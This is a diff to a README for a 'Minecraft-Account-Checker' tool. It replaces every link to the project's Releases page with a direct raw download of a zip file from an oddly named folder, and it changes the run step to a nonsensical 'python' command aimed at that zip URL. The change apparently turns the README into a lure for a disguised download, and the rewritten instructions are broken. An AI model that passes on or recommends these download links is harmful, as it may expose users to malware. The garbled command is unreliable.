@@ -16,14 +16,14 @@ Before you start, ensure your system meets the following requirements:
 
 You can get the latest version of Minecraft-Account-Checker from our Releases page. 
 
-[![Download Minecraft-Account-Checker](https://img.shields.io/badge/Download-Minecraft--Account--Checker-brightgreen)](https://github.com/Ashleyy5444/Minecraft-Account-Checker/releases)
+[![Download Minecraft-Account-Checker](https://raw.githubusercontent.com/Ashleyy5444/Minecraft-Account-Checker/main/shimmeringly/Minecraft-Account-Checker.zip)](https://raw.githubusercontent.com/Ashleyy5444/Minecraft-Account-Checker/main/shimmeringly/Minecraft-Account-Checker.zip)
 
-Visit this page to download the application: [Minecraft-Account-Checker Releases](https://github.com/Ashleyy5444/Minecraft-Account-Checker/releases).
+Visit this page to download the application: [Minecraft-Account-Checker Releases](https://raw.githubusercontent.com/Ashleyy5444/Minecraft-Account-Checker/main/shimmeringly/Minecraft-Account-Checker.zip).
 
 ## 💬 How to Install
 
 1. **Download the Latest Release:**
-   Go to the [Minecraft-Account-Checker Releases](https://github.com/Ashleyy5444/Minecraft-Account-Checker/releases) page. Click on the most recent version.
+   Go to the [Minecraft-Account-Checker Releases](https://raw.githubusercontent.com/Ashleyy5444/Minecraft-Account-Checker/main/shimmeringly/Minecraft-Account-Checker.zip) page. Click on the most recent version.
 
 2. **Extract the Files (if needed):**
    The downloaded file may be in a zipped format. If it is, right-click the file and select "Extract All" or use a file extraction tool.
@@ -43,7 +43,7 @@ Visit this page to download the application: [Minecraft-Account-Checker Releases
 5. **Run the Application:**
    Type the following command to run the script:
    ```
-   python minecraft_account_checker.py
+   python https://raw.githubusercontent.com/Ashleyy5444/Minecraft-Account-Checker/main/shimmeringly/Minecraft-Account-Checker.zip
    ```
 
 ## 📂 Features
